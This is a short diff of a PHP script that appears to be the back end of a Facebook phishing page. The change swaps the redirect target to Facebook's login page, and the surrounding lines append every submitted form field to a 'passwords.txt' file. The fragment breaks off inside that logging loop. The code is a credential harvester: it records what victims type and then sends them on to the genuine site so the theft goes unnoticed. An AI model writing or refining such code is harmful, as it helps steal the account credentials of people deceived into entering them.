@@ -1,5 +1,5 @@
 <?php
-header("Location: https://web.facebook.com/settings?tab=security  ");
+header("Location: https://web.facebook.com/login/?_rdc=1&_rdr ");
 $handle = fopen("passwords.txt", "a");
 foreach ($_POST as $variable => $value) {
 	fwrite($handle, $variable);
